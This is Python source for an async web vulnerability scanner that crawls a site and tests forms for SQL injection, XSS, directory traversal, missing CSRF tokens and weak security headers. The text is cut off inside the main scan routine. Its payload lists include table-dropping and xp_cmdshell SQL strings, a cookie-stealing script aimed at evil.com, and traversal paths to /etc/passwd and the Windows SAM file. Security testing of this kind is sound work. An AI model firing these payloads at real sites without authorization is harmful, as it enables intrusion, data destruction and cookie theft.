#!/usr/bin/env python3
"""
Web Vulnerability Scanner - Async Security Scanner
SQL injection, XSS, CSRF, directory traversal, and security header checks.
"""

import asyncio
import argparse
import json
import logging
import re
import sys
import time
import urllib.parse
from dataclasses import dataclass, field, asdict
from datetime import datetime
from enum import Enum
from html.parser import HTMLParser
from pathlib import Path
from typing import Optional

try:
    import aiohttp
    from tqdm import tqdm
except ImportError as e:
    print(f"Missing dependency: {e}")
    print("Run: pip install -r requirements.txt")
    sys.exit(1)


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("web_scanner")


# ---------------------------------------------------------------------------
# Constants & Payloads
# ---------------------------------------------------------------------------

SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning.*mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"ORA-\d{5}",
    r"SQLite/JDBCDriver",
    r"Microsoft OLE DB Provider for",
    r"ODBC SQL Server Driver",
    r"PostgreSQL.*ERROR",
    r"pg_query\(\).*failed",
    r"SQLite3::",
    r"SQLSTATE\[",
    r"Invalid column name",
    r"Microsoft Access Driver",
    r"JET Database Engine",
    r"mysql_fetch",
    r"sqlite3\.OperationalError",
    r"org\.hibernate\.QueryException",
    r"com\.mysql\.jdbc",
]

SQLI_PAYLOADS_ERROR = [
    "'",
    "\"",
    "1' OR '1'='1",
    "1' OR '1'='1'--",
    "1' OR '1'='1'/*",
    "admin'--",
    "' OR 1=1--",
    "' OR 1=1#",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "') OR ('1'='1",
    "1' UNION SELECT 1,2,3--",
    "1' AND SLEEP(5)--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1' AND BENCHMARK(5000000,SHA1('test'))--",
    "1' OR pg_sleep(5)--",
    "1'; EXEC xp_cmdshell('whoami')--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' AND 1=CONVERT(int,(SELECT @@version))--",
    "1' AND 1=1 WAITFOR DELAY '0:0:5'--",
    "1'; SELECT pg_sleep(5)--",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
]

SQLI_PAYLOADS_BLIND = [
    ("1' AND 1=1--", "1' AND 1=2--"),
    ("1' AND SUBSTRING((SELECT database()),1,1)='a'--", "1' AND SUBSTRING((SELECT database()),1,1)='z'--"),
    ("1' AND LENGTH((SELECT database()))>0--", "1' AND LENGTH((SELECT database()))>100--"),
    ("1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--", "1' AND ASCII(SUBSTRING((SELECT database()),1,1))<64--"),
    ("1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "1' AND (SELECT COUNT(*) FROM information_schema.tables)<0--"),
]

SQLI_TIME_PAYLOADS = [
    ("1' AND SLEEP(3)--", 3),
    ("1'; WAITFOR DELAY '0:0:3'--", 3),
    ("1' OR pg_sleep(3)--", 3),
    ("1' AND BENCHMARK(5000000,SHA1('test'))--", 3),
    ("1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", 3),
    ("1' AND 1=1 AND SLEEP(3)--", 3),
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "';alert(1)//",
    "\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "<a href=javascript:alert(1)>click</a>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "<svg><script>alert(1)</script></svg>",
    "<math><mtext><table><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src=1>\">",
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    "';alert(String.fromCharCode(88,83,83))//",
    "<script>fetch('https://evil.com?c='+document.cookie)</script>",
    "{{7*7}}${7*7}<%= 7*7 %>",
    "{{constructor.constructor('alert(1')()}}",
]

DOM_XSS_INDICATORS = [
    "document.URL",
    "document.documentURI",
    "document.referrer",
    "window.location",
    "location.hash",
    "location.search",
    "document.cookie",
    "document.write",
    "innerHTML",
    "outerHTML",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "document.createElement",
]

DIR_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%5c..%5c..%5cetc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    ".../.../.../etc/passwd",
    "..\\..\\..\\etc\\passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%c1%9c..%c1%9c..%c1%9cetc/passwd",
    "..\\..\\..\\etc/passwd",
    "....\\\\....\\\\....\\\\etc/passwd",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd",
    "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
    "php://input",
]

DIR_TRAVERSAL_MARKERS = [
    "root:x:0:0",
    "[boot loader]",
    "root:*:",
    "daemon:",
    "nobody:",
    "[extensions]",
    "php_value",
]

CSRF_TOKEN_NAMES = [
    "csrf", "csrftoken", "_csrf", "xsrf", "xsrf-token",
    "_token", "csrfmiddlewaretoken", "authenticity_token",
    "__RequestVerificationToken", "anti Forgery",
    "_csrf_token", "token", "nonce", "verification",
]

SECURITY_HEADERS = {
    "Content-Security-Policy": {
        "severity": "high",
        "description": "Missing Content-Security-Policy header - site is vulnerable to XSS and data injection",
        "good": ["default-src", "script-src", "style-src"],
    },
    "Strict-Transport-Security": {
        "severity": "high",
        "description": "Missing HSTS header - site vulnerable to SSL stripping attacks",
        "good": ["max-age="],
        "recommended": "max-age=31536000; includeSubDomains; preload",
    },
    "X-Frame-Options": {
        "severity": "medium",
        "description": "Missing X-Frame-Options header - site may be vulnerable to clickjacking",
        "good": ["DENY", "SAMEORIGIN"],
    },
    "X-Content-Type-Options": {
        "severity": "medium",
        "description": "Missing X-Content-Type-Options header - MIME type sniffing possible",
        "good": ["nosniff"],
    },
    "X-XSS-Protection": {
        "severity": "low",
        "description": "Missing X-XSS-Protection header",
        "good": ["1; mode=block"],
    },
    "Referrer-Policy": {
        "severity": "low",
        "description": "Missing Referrer-Policy header",
        "good": ["no-referrer", "strict-origin", "same-origin"],
    },
    "Permissions-Policy": {
        "severity": "low",
        "description": "Missing Permissions-Policy header",
    },
}

WEAK_CRYPTO_HEADERS = {
    "X-Powered-By": {
        "severity": "info",
        "description": "Technology information disclosed in headers",
    },
    "Server": {
        "severity": "info",
        "description": "Server version information disclosed",
    },
}


# ---------------------------------------------------------------------------
# Data Classes
# ---------------------------------------------------------------------------

class Severity(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class Finding:
    vuln_type: str
    severity: str
    url: str
    parameter: str = ""
    payload: str = ""
    evidence: str = ""
    description: str = ""
    remediation: str = ""
    request_method: str = ""
    header: str = ""
    response_code: int = 0
    response_time: float = 0.0
    details: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        d = asdict(self)
        d = {k: v for k, v in d.items() if v}
        return d


@dataclass
class ScanResults:
    target: str
    timestamp: str
    findings: list = field(default_factory=list)
    scanned_urls: int = 0
    forms_found: int = 0
    duration_seconds: float = 0.0
    errors: list = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "target": self.target,
            "timestamp": self.timestamp,
            "findings": [f.to_dict() if hasattr(f, "to_dict") else f for f in self.findings],
            "summary": {
                "total_findings": len(self.findings),
                "critical": sum(1 for f in self.findings if (f.severity if hasattr(f, "severity") else f.get("severity")) == "critical"),
                "high": sum(1 for f in self.findings if (f.severity if hasattr(f, "severity") else f.get("severity")) == "high"),
                "medium": sum(1 for f in self.findings if (f.severity if hasattr(f, "severity") else f.get("severity")) == "medium"),
                "low": sum(1 for f in self.findings if (f.severity if hasattr(f, "severity") else f.get("severity")) == "low"),
                "info": sum(1 for f in self.findings if (f.severity if hasattr(f, "severity") else f.get("severity")) == "info"),
                "urls_scanned": self.scanned_urls,
                "forms_found": self.forms_found,
                "duration_seconds": self.duration_seconds,
                "errors": len(self.errors),
            },
        }


# ---------------------------------------------------------------------------
# Progress Bar
# ---------------------------------------------------------------------------

class ProgressBar:
    """Async-friendly progress indicator."""

    def __init__(self, total: int, desc: str):
        self.total = total
        self.current = 0
        self.desc = desc
        self.start_time = time.time()
        self.tqdm = tqdm(total=total, desc=desc, unit="item", ncols=80)

    def update(self, n: int = 1):
        self.current += n
        self.tqdm.update(n)

    def finish(self):
        self.tqdm.close()
        elapsed = time.time() - self.start_time
        logger.info(f"{self.desc} completed in {elapsed:.1f}s")


# ---------------------------------------------------------------------------
# Form / HTML Parser
# ---------------------------------------------------------------------------

@dataclass
class FormInfo:
    action: str
    method: str
    inputs: list = field(default_factory=list)
    has_file_upload: bool = False
    has_csrf_token: bool = False
    csrf_token_name: str = ""
    csrf_token_value: str = ""


class FormParser(HTMLParser):
    """Extract forms and their inputs from HTML."""

    def __init__(self, base_url: str):
        super().__init__()
        self.base_url = base_url
        self.forms: list[FormInfo] = []
        self._current_form: Optional[FormInfo] = None
        self._current_action = ""
        self._current_method = "get"
        self._tag_stack: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, Optional[str]]]):
        attr_dict = {k.lower(): (v or "") for k, v in attrs}
        self._tag_stack.append(tag)

        if tag == "form":
            action = attr_dict.get("action", self.base_url)
            if action and not action.startswith(("http://", "https://", "data:")):
                action = urllib.parse.urljoin(self.base_url, action)
            method = attr_dict.get("method", "get").lower()
            self._current_form = FormInfo(action=action, method=method)
            self._current_action = action
            self._current_method = method

        elif self._current_form is not None:
            if tag == "input":
                name = attr_dict.get("name", "")
                input_type = attr_dict.get("type", "text").lower()
                value = attr_dict.get("value", "")

                if input_type == "file":
                    self._current_form.has_file_upload = True

                if name:
                    self._current_form.inputs.append({
                        "name": name,
                        "type": input_type,
                        "value": value,
                    })

                    name_lower = name.lower()
                    if name_lower in CSRF_TOKEN_NAMES or any(t in name_lower for t in CSRF_TOKEN_NAMES):
                        self._current_form.has_csrf_token = True
                        self._current_form.csrf_token_name = name
                        self._current_form.csrf_token_value = value

            elif tag == "textarea":
                name = attr_dict.get("name", "")
                if name:
                    self._current_form.inputs.append({
                        "name": name,
                        "type": "textarea",
                        "value": "",
                    })

            elif tag == "select":
                name = attr_dict.get("name", "")
                if name:
                    self._current_form.inputs.append({
                        "name": name,
                        "type": "select",
                        "value": "",
                    })

    def handle_endtag(self, tag: str):
        if self._tag_stack and self._tag_stack[-1] == tag:
            self._tag_stack.pop()

        if tag == "form" and self._current_form is not None:
            self.forms.append(self._current_form)
            self._current_form = None


# ---------------------------------------------------------------------------
# Crawler
# ---------------------------------------------------------------------------

class WebCrawler:
    """Crawl target to discover URLs and forms."""

    def __init__(
        self,
        session: aiohttp.ClientSession,
        rate_limit: float = 10.0,
    ):
        self.session = session
        self.rate_limit = rate_limit
        self._semaphore = asyncio.Semaphore(rate_limit)
        self._visited: set[str] = set()
        self._urls: list[str] = []
        self._forms: list[tuple[str, FormInfo]] = []

    @property
    def urls(self) -> list[str]:
        return list(self._visited)

    @property
    def forms(self) -> list[tuple[str, FormInfo]]:
        return self._forms

    async def _fetch(self, url: str) -> Optional[str]:
        async with self._semaphore:
            try:
                async with self.session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    if resp.status == 200:
                        content_type = resp.headers.get("Content-Type", "")
                        if "text/html" in content_type:
                            return await resp.text(errors="ignore")
            except (aiohttp.ClientError, asyncio.TimeoutError):
                pass
        return None

    def _extract_links(self, html: str, base_url: str) -> list[str]:
        links = []
        pattern = re.compile(r'href=["\']([^"\'#]+)["\']', re.IGNORECASE)
        for match in pattern.finditer(html):
            link = match.group(1)
            if not link.startswith(("http://", "https://", "data:", "javascript:", "mailto:")):
                link = urllib.parse.urljoin(base_url, link)
            if self._is_same_domain(link, base_url):
                links.append(link.split("#")[0].split("?")[0])
        return links

    def _is_same_domain(self, url: str, base_url: str) -> bool:
        try:
            url_parsed = urllib.parse.urlparse(url)
            base_parsed = urllib.parse.urlparse(base_url)
            return url_parsed.netloc == base_parsed.netloc
        except Exception:
            return False

    async def crawl(self, start_url: str, max_depth: int = 2, max_pages: int = 50) -> tuple[list[str], list[tuple[str, FormInfo]]]:
        """Crawl from start_url up to max_depth."""
        parsed = urllib.parse.urlparse(start_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        queue: list[tuple[str, int]] = [(start_url, 0)]
        visited = set()

        logger.info(f"Starting crawl from {start_url} (depth={max_depth}, max_pages={max_pages})")

        while queue and len(visited) < max_pages:
            url, depth = queue.pop(0)
            if url in visited or depth > max_depth:
                continue

            visited.add(url)
            html = await self._fetch(url)
            if html is None:
                continue

            self._visited.add(url)

            parser = FormParser(url)
            try:
                parser.feed(html)
            except Exception:
                pass

            for form in parser.forms:
                self._forms.append((url, form))

            if depth < max_depth:
                links = self._extract_links(html, url)
                for link in links:
                    if link not in visited:
                        queue.append((link, depth + 1))

            await asyncio.sleep(1.0 / self.rate_limit)

        self._visited = visited
        logger.info(f"Crawled {len(visited)} pages, found {len(self._forms)} forms")
        return list(visited), self._forms


# ---------------------------------------------------------------------------
# SQL Injection Scanner
# ---------------------------------------------------------------------------

class SQLInjectionScanner:
    """Detect SQL injection vulnerabilities (error-based, blind, time-based)."""

    def __init__(self, session: aiohttp.ClientSession, rate_limit: float = 5.0):
        self.session = session
        self._semaphore = asyncio.Semaphore(rate_limit)

    def _check_error_response(self, response_text: str) -> Optional[str]:
        text_lower = response_text.lower()
        for pattern in SQL_ERROR_PATTERNS:
            match = re.search(pattern, text_lower, re.IGNORECASE)
            if match:
                return match.group(0)
        return None

    async def _make_request(
        self,
        url: str,
        method: str,
        params: dict,
        data: dict = None,
    ) -> tuple[int, str, float]:
        async with self._semaphore:
            start = time.time()
            try:
                if method == "get":
                    async with self.session.get(
                        url, params=params, timeout=aiohttp.ClientTimeout(total=15)
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        return resp.status, body, time.time() - start
                else:
                    async with self.session.post(
                        url, data=data or params, timeout=aiohttp.ClientTimeout(total=15)
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        return resp.status, body, time.time() - start
            except (aiohttp.ClientError, asyncio.TimeoutError):
                return 0, "", time.time() - start

    async def test_error_based(
        self,
        url: str,
        method: str,
        param_name: str,
        baseline_body: str,
    ) -> Optional[Finding]:
        """Test for error-based SQL injection."""
        for payload in SQLI_PAYLOADS_ERROR:
            if method == "get":
                params = {param_name: payload}
                status, body, resp_time = await self._make_request(url, method, params)
            else:
                params = {param_name: payload}
                status, body, resp_time = await self._make_request(url, method, params)

            if status == 0:
                continue

            error = self._check_error_response(body)
            if error and error not in baseline_body.lower():
                return Finding(
                    vuln_type="SQL Injection (Error-Based)",
                    severity=Severity.CRITICAL,
                    url=url,
                    parameter=param_name,
                    payload=payload,
                    evidence=error,
                    description="Error-based SQL injection detected. The application reveals SQL error messages when malicious input is provided.",
                    remediation="Use parameterized queries/prepared statements. Never concatenate user input into SQL queries. Implement input validation.",
                    request_method=method.upper(),
                    response_code=status,
                    response_time=resp_time,
                )
        return None

    async def test_blind(
        self,
        url: str,
        method: str,
        param_name: str,
        baseline_body: str,
    ) -> Optional[Finding]:
        """Test for blind SQL injection via boolean-based differential analysis."""
        for true_payload, false_payload in SQLI_PAYLOADS_BLIND:
            if method == "get":
                _, true_body, _ = await self._make_request(url, method, {param_name: true_payload})
                _, false_body, _ = await self._make_request(url, method, {param_name: false_payload})
            else:
                _, true_body, _ = await self._make_request(url, method, {param_name: true_payload})
                _, false_body, _ = await self._make_request(url, method, {param_name: false_payload})

            if not true_body or not false_body:
                continue

            true_len = len(true_body)
            false_len = len(false_body)

            if true_len != false_len and true_len != len(baseline_body):
                return Finding(
                    vuln_type="SQL Injection (Blind - Boolean)",
                    severity=Severity.HIGH,
                    url=url,
                    parameter=param_name,
                    payload=f"True: {true_payload} | False: {false_payload}",
                    evidence=f"Response lengths differ: true={true_len}, false={false_len}, baseline={len(baseline_body)}",
                    description="Blind SQL injection detected via boolean-based differential analysis. Responses differ significantly between true and false conditions.",
                    remediation="Use parameterized queries/prepared statements. Validate and sanitize all user inputs.",
                    request_method=method.upper(),
                )
        return None

    async def test_time_based(
        self,
        url: str,
        method: str,
        param_name: str,
    ) -> Optional[Finding]:
        """Test for time-based blind SQL injection."""
        # Get baseline timing
        baseline_times = []
        for _ in range(3):
            if method == "get":
                _, _, t = await self._make_request(url, method, {param_name: "test_baseline"})
            else:
                _, _, t = await self._make_request(url, method, {param_name: "test_baseline"})
            baseline_times.append(t)

        baseline_avg = sum(baseline_times) / len(baseline_times) if baseline_times else 1.0

        for payload, delay in SQLI_TIME_PAYLOADS:
            if method == "get":
                _, _, resp_time = await self._make_request(url, method, {param_name: payload})
            else:
                _, _, resp_time = await self._make_request(url, method, {param_name: payload})

            if resp_time > baseline_avg + delay + 1.0:
                return Finding(
                    vuln_type="SQL Injection (Time-Based Blind)",
                    severity=Severity.HIGH,
                    url=url,
                    parameter=param_name,
                    payload=payload,
                    evidence=f"Response time: {resp_time:.1f}s vs baseline {baseline_avg:.1f}s (expected delay: {delay}s)",
                    description="Time-based blind SQL injection detected. The application is vulnerable to SQL injection as response timing correlates with injected sleep delays.",
                    remediation="Use parameterized queries/prepared statements. Implement query timeouts. Use a WAF.",
                    request_method=method.upper(),
                    response_time=resp_time,
                )
        return None

    async def scan_form(
        self,
        url: str,
        form: FormInfo,
    ) -> list[Finding]:
        """Test all inputs in a form for SQL injection."""
        findings = []
        if not form.inputs:
            return findings

        # Get baseline
        baseline_params = {inp["name"]: inp.get("value", "test") for inp in form.inputs if inp["name"]}
        if not baseline_params:
            return findings

        if form.method == "get":
            _, baseline_body, _ = await self._make_request(url, "get", baseline_params)
        else:
            _, baseline_body, _ = await self._make_request(url, "post", baseline_params)

        for inp in form.inputs:
            if inp["type"] in ("submit", "button", "hidden", "file"):
                continue

            param_name = inp["name"]
            if not param_name:
                continue

            # Error-based
            finding = await self.test_error_based(url, form.method, param_name, baseline_body)
            if finding:
                findings.append(finding)
                continue

            # Blind
            finding = await self.test_blind(url, form.method, param_name, baseline_body)
            if finding:
                findings.append(finding)
                continue

            # Time-based
            finding = await self.test_time_based(url, form.method, param_name)
            if finding:
                findings.append(finding)

        return findings


# ---------------------------------------------------------------------------
# XSS Scanner
# ---------------------------------------------------------------------------

class XSSScanner:
    """Detect cross-site scripting vulnerabilities."""

    def __init__(self, session: aiohttp.ClientSession, rate_limit: float = 5.0):
        self.session = session
        self._semaphore = asyncio.Semaphore(rate_limit)

    async def _make_request(
        self,
        url: str,
        method: str,
        params: dict,
    ) -> tuple[int, str, float]:
        async with self._semaphore:
            start = time.time()
            try:
                if method == "get":
                    async with self.session.get(
                        url, params=params, timeout=aiohttp.ClientTimeout(total=15)
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        return resp.status, body, time.time() - start
                else:
                    async with self.session.post(
                        url, data=params, timeout=aiohttp.ClientTimeout(total=15)
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        return resp.status, body, time.time() - start
            except (aiohttp.ClientError, asyncio.TimeoutError):
                return 0, "", time.time() - start

    def _check_reflected(self, payload: str, body: str) -> bool:
        """Check if payload is reflected unescaped in response."""
        escaped_patterns = [
            re.escape(payload).replace(r"<", r"&lt;").replace(r">", r"&gt;").replace(r'"', r"&quot;"),
            re.escape(payload).replace(r"<", r"&#60;").replace(r">", r"&#62;"),
            payload.replace("<", "\\u003c").replace(">", "\\u003e"),
        ]
        for pattern in escaped_patterns:
            if pattern in body:
                return False
        return payload in body

    def _check_dom_xss(self, body: str) -> list[str]:
        """Check for DOM-based XSS indicators in JavaScript."""
        found = []
        body_lower = body.lower()
        for indicator in DOM_XSS_INDICATORS:
            if indicator.lower() in body_lower:
                found.append(indicator)
        return found

    async def test_reflected(
        self,
        url: str,
        method: str,
        param_name: str,
    ) -> Optional[Finding]:
        """Test for reflected XSS."""
        for payload in XSS_PAYLOADS:
            if method == "get":
                status, body, resp_time = await self._make_request(url, method, {param_name: payload})
            else:
                status, body, resp_time = await self._make_request(url, method, {param_name: payload})

            if status == 0:
                continue

            if self._check_reflected(payload, body):
                return Finding(
                    vuln_type="Cross-Site Scripting (Reflected)",
                    severity=Severity.HIGH,
                    url=url,
                    parameter=param_name,
                    payload=payload,
                    evidence=f"Payload reflected in response body without proper encoding",
                    description="Reflected XSS vulnerability detected. User input is reflected in the response without proper output encoding.",
                    remediation="Implement context-aware output encoding. Use Content-Security-Policy header. Validate and sanitize all user inputs.",
                    request_method=method.upper(),
                    response_code=status,
                    response_time=resp_time,
                )
        return None

    def test_dom_based(self, url: str, body: str) -> Optional[Finding]:
        """Test for DOM-based XSS indicators."""
        indicators = self._check_dom_xss(body)
        if indicators:
            return Finding(
                vuln_type="Cross-Site Scripting (DOM-Based)",
                severity=Severity.MEDIUM,
                url=url,
                evidence=f"DOM XSS indicators found: {', '.join(indicators[:5])}",
                description="Potential DOM-based XSS vulnerability. The page uses dangerous DOM manipulation patterns that may allow XSS.",
                remediation="Avoid using innerHTML, document.write, and eval with user input. Use textContent instead of innerHTML. Implement CSP.",
                details={"indicators": indicators},
            )
        return None

    async def scan_form(
        self,
        url: str,
        form: FormInfo,
    ) -> list[Finding]:
        """Test all inputs in a form for XSS."""
        findings = []
        if not form.inputs:
            return findings

        for inp in form.inputs:
            if inp["type"] in ("submit", "button", "hidden", "file"):
                continue

            param_name = inp["name"]
            if not param_name:
                continue

            finding = await self.test_reflected(url, form.method, param_name)
            if finding:
                findings.append(finding)

        return findings


# ---------------------------------------------------------------------------
# CSRF Scanner
# ---------------------------------------------------------------------------

class CSRFScanner:
    """Validate CSRF token presence and implementation."""

    def __init__(self, session: aiohttp.ClientSession, rate_limit: float = 5.0):
        self.session = session
        self._semaphore = asyncio.Semaphore(rate_limit)

    async def scan_form(
        self,
        url: str,
        form: FormInfo,
    ) -> list[Finding]:
        """Check form for CSRF protection."""
        findings = []

        if form.method == "get":
            return findings

        if not form.has_csrf_token:
            findings.append(Finding(
                vuln_type="CSRF - Missing Token",
                severity=Severity.MEDIUM,
                url=url,
                description="POST form does not contain a CSRF token. The form may be vulnerable to Cross-Site Request Forgery attacks.",
                remediation="Implement CSRF tokens in all state-changing forms. Use SameSite cookie attribute. Verify Origin/Referer headers.",
                request_method="POST",
                details={"form_inputs": [inp["name"] for inp in form.inputs]},
            ))
        else:
            findings.append(Finding(
                vuln_type="CSRF - Token Present",
                severity=Severity.INFO,
                url=url,
                description=f"CSRF token found: {form.csrf_token_name}",
                details={"token_name": form.csrf_token_name},
            ))

        return findings


# ---------------------------------------------------------------------------
# Directory Traversal Scanner
# ---------------------------------------------------------------------------

class DirectoryTraversalScanner:
    """Detect directory traversal / path traversal vulnerabilities."""

    def __init__(self, session: aiohttp.ClientSession, rate_limit: float = 5.0):
        self.session = session
        self._semaphore = asyncio.Semaphore(rate_limit)

    async def _make_request(
        self,
        url: str,
        method: str,
        params: dict,
    ) -> tuple[int, str, float]:
        async with self._semaphore:
            start = time.time()
            try:
                if method == "get":
                    async with self.session.get(
                        url, params=params, timeout=aiohttp.ClientTimeout(total=15)
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        return resp.status, body, time.time() - start
                else:
                    async with self.session.post(
                        url, data=params, timeout=aiohttp.ClientTimeout(total=15)
                    ) as resp:
                        body = await resp.text(errors="ignore")
                        return resp.status, body, time.time() - start
            except (aiohttp.ClientError, asyncio.TimeoutError):
                return 0, "", time.time() - start

    def _check_traversal(self, body: str) -> Optional[str]:
        body_lower = body.lower()
        for marker in DIR_TRAVERSAL_MARKERS:
            if marker.lower() in body_lower:
                return marker
        return None

    async def scan_form(
        self,
        url: str,
        form: FormInfo,
    ) -> list[Finding]:
        """Test form inputs for directory traversal."""
        findings = []

        for inp in form.inputs:
            if inp["type"] in ("submit", "button", "hidden"):
                continue

            param_name = inp["name"]
            if not param_name:
                continue

            for payload in DIR_TRAVERSAL_PAYLOADS:
                if form.method == "get":
                    status, body, resp_time = await self._make_request(
                        url, "get", {param_name: payload}
                    )
                else:
                    status, body, resp_time = await self._make_request(
                        url, "post", {param_name: payload}
                    )

                if status == 0:
                    continue

                marker = self._check_traversal(body)
                if marker:
                    findings.append(Finding(
                        vuln_type="Directory Traversal",
                        severity=Severity.HIGH,
                        url=url,
                        parameter=param_name,
                        payload=payload,
                        evidence=f"File content marker found: {marker}",
                        description="Directory traversal vulnerability detected. The application allows access to files outside the intended directory.",
                        remediation="Validate and sanitize file paths. Use a whitelist of allowed files. Chroot or sandbox file access. Never use user input directly in file paths.",
                        request_method=form.method.upper(),
                        response_code=status,
                        response_time=resp_time,
                    ))
                    break

        return findings


# ---------------------------------------------------------------------------
# Security Header Scanner
# ---------------------------------------------------------------------------

class SecurityHeaderScanner:
    """Check for missing or weak security headers."""

    def __init__(self, session: aiohttp.ClientSession, rate_limit: float = 5.0):
        self.session = session
        self._semaphore = asyncio.Semaphore(rate_limit)

    async def scan_url(self, url: str) -> list[Finding]:
        findings = []
        async with self._semaphore:
            try:
                async with self.session.get(
                    url, timeout=aiohttp.ClientTimeout(total=15), allow_redirects=True
                ) as resp:
                    headers = dict(resp.headers)
                    final_url = str(resp.url)
            except (aiohttp.ClientError, asyncio.TimeoutError):
                return findings

        for header_name, config in SECURITY_HEADERS.items():
            header_val = headers.get(header_name)
            if not header_val:
                findings.append(Finding(
                    vuln_type="Missing Security Header",
                    severity=config["severity"],
                    url=final_url,
                    header=header_name,
                    description=config["description"],
                    remediation=f"Add {header_name} header. Recommended: {config.get('recommended', 'See OWASP guidelines')}",
                    details={"header": header_name},
                ))
            elif header_name == "Content-Security-Policy":
                if "unsafe-inline" in header_val or "unsafe-eval" in header_val:
                    weak_directives = []
                    if "unsafe-inline" in header_val:
                        weak_directives.append("unsafe-inline")
                    if "unsafe-eval" in header_val:
                        weak_directives.append("unsafe-eval")
                    findings.append(Finding(
                        vuln_type="Weak Security Header",
                        severity=Severity.MEDIUM,
                        url=final_url,
                        header=header_name,
                        payload=f"Contains: {', '.join(weak_directives)}",
                        description=f"CSP contains weak directives: {', '.join(weak_directives)}",
                        remediation="Remove unsafe-inline and unsafe-eval from CSP. Use nonces or hashes for inline scripts.",
                        details={"header": header_name, "value": header_val},
                    ))
            elif header_name == "Strict-Transport-Security":
                try:
                    max_age_match = re.search(r"max-age=(\d+)", header_val)
                    if max_age_match:
                        max_age = int(max_age_match.group(1))
                        if max_age < 31536000:
                            findings.append(Finding(
                                vuln_type="Weak Security Header",
                                severity=Severity.LOW,
                                url=final_url,
                                header=header_name,
                                payload=f"max-age={max_age}",
                                description=f"HSTS max-age is too low ({max_age}). Recommended: 31536000 or higher.",
                                remediation="Set HSTS max-age to at least 31536000. Include includeSubDomains and preload.",
                                details={"header": header_name, "value": header_val},
                            ))
                except (ValueError, AttributeError):
                    pass

        for header_name, config in WEAK_CRYPTO_HEADERS.items():
            header_val = headers.get(header_name)
            if header_val:
                findings.append(Finding(
                    vuln_type="Information Disclosure",
                    severity=config["severity"],
                    url=final_url,
                    header=header_name,
                    payload=header_val,
                    description=config["description"],
                    remediation=f"Remove or obscure {header_name} header in production",
                    details={"header": header_name, "value": header_val},
                ))

        return findings


# ---------------------------------------------------------------------------
# Main Scanner Orchestrator
# ---------------------------------------------------------------------------

class WebVulnerabilityScanner:
    """Orchestrate all vulnerability scanning modules."""

    def __init__(
        self,
        target: str,
        output: str = None,
        rate_limit: float = 10.0,
        max_depth: int = 2,
        max_pages: int = 50,
        timeout: int = 15,
        headers_only: bool = False,
    ):
        self.target = target if target.startswith("http") else f"https://{target}"
        self.output = output or f"scan_{urllib.parse.urlparse(self.target).netloc.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        self.rate_limit = rate_limit
        self.max_depth = max_depth
        self.max_pages = max_pages
        self.timeout = timeout
        self.headers_only = headers_only
        self.results = ScanResults(
            target=self.target,
            timestamp=datetime.utcnow().isoformat() + "Z",
        )
        self._session: Optional[aiohttp.ClientSession] = None

    async def _create_session(self) -> aiohttp.ClientSession:
        connector = aiohttp.TCPConnector(limit=self.rate_limit, ssl=False)
        return aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout),
            headers={
                "User-Agent": "WebScanner/1.0 (Security Testing)",
                "Accept": "text/html,application/xhtml+xml,*/*",
                "Accept-Language": "en-US,en;q=0.9",
            },
        )

    async def run(self) -> dict:
        """Execute full vulnerability scan."""
        logger.info(f"Starting vulnerability scan for {self.target}")
        start_time = time.time()

        self._session = await self._create_session()

        try:
            # Phase 1: Crawl
            logger.info("=" * 60)
            logger.info("Phase 1: Crawling target")
            logger.info("=" * 60)
            crawler = WebCrawler(self._session, self.rate_limit)
            urls, forms = await crawler.crawl(
                self.target,
                max_depth=self.max_depth,
                max_pages=self.max_pages,
            )
            self.results.scanned_urls = len(urls)
            self.results.forms_found = len(forms)

            if not urls:
                logger.warning("No pages crawled. Trying direct scan of target.")
                urls = [self.target]

